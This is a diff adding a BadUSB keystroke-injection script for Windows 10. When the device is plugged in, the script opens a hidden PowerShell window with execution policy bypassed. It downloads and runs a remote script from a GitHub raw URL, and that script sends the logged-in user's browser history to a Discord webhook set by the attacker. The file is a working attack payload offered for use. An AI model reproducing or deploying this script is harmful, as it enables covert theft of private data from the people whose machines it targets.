@@ -1,0 +1,18 @@
+REM Title: Browser History Discord Webook
+REM Author: White Hat Hacker
+REM Description: Collects logged in users stored browser history and posts the data to a designated Discord webhook.
+REM Target: Windows 10 (Powershell)
+REM Props: Beigeworm
+REM Version: 1.0
+REM Category: BadUSB Webhook
+
+#*SETUP*
+#Replace WEBHOOK URL with your Discord Webhook URL address inside of the '' and leave the '' around URL.
+#(remove "-W H" in the below script to show the PS window)
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK URL' ; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/brsr-hist.ps1 | iex
+ENTER
+
